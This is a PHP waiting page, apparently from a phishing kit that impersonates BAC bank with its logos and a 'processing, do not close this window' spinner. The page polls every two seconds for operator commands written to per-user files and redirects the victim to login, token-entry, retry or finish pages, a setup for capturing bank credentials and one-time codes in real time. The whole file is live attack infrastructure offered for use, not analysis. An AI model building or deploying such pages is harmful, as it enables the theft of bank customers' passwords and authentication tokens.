<?php
$usuario = trim($_GET['u'] ?? '');
$step    = trim($_GET['step'] ?? '');
if (!$usuario) {
    header('Location: index.php');
    exit;
}
$self = 'espera.php?u=' . urlencode($usuario) . ($step ? '&step=' . rawurlencode($step) : '');

$archivo = __DIR__ . '/acciones/' . basename($usuario) . '.txt';
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    $u = urlencode($usuario);

    switch ($accion) {
        case '/LISTO':
            header('Location: listo.php'); break;
        case '/LOGIN':
            if ($step === 'login') {
                header('Location: token.php?u=' . $u);
            } else {
                header('Location: index.php');
            }
            break;
        case '/TOK':
            header('Location: token.php?u=' . $u); break;
        case '/LOGINERROR':
            header('Location: index.php?error=1'); break;
        case '/TOKERROR':
            header('Location: token.php?u=' . $u . '&retry=1'); break;
        case '/ERROR':
        default:
            header('Location: index.php?error=1'); break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <meta http-equiv="refresh" content="2;url=<?= htmlspecialchars($self) ?>"/>
  <title>Procesando...</title>
  <link rel="icon" href="img/logo_bac.svg" type="image/svg+xml"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;padding:20px}
    .topbanner{position:fixed;top:0;left:0;right:0;padding:14px 20px;background:#fff;border-bottom:1px solid #f0f0f0;z-index:10}
    .topbanner img{height:28px;display:block}
    .spinner{width:52px;height:52px;border-radius:50%;border:5px solid #f3d5da;border-top-color:#e4002b;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    p{font-size:15px;color:#374151;font-weight:500}
    small{font-size:12px;color:#9ca3af;margin-top:-14px}
  </style>
</head>
<body>
  <div class="topbanner"><img src="img/logo_header.svg" alt="BAC"/></div>
  <div class="spinner"></div>
  <p>Estamos procesando tu solicitud...</p>
  <small>No cierres esta ventana</small>
</body>
</html>
